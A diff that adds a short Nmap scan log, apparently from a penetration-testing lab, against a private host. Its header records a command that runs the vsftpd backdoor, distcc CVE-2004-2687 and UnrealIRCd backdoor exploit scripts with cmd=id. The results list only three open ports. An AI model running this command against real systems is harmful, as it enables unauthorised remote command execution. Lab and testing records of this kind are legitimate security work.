@@ -1,0 +1,4 @@
+# Nmap 7.99 scan initiated Thu Nov 12 10:40:01 2026 as: /usr/lib/nmap/nmap -p 21,3632,6667 --script ftp-vsftpd-backdoor,distcc-cve2004-2687,irc-unrealircd-backdoor --script-args distcc-cve2004-2687.cmd=id,ftp-vsftpd-backdoor.cmd=id -oA /home/kali/vuln/p8-02-backdoors 10.10.10.30
+Host: 10.10.10.30 ()	Status: Up
+Host: 10.10.10.30 ()	Ports: 21/open/tcp//ftp///, 3632/open/tcp//distccd///, 6667/open/tcp//irc///
+# Nmap done at Thu Nov 12 10:40:41 2026 -- 1 IP address (1 host up) scanned in 40.49 seconds
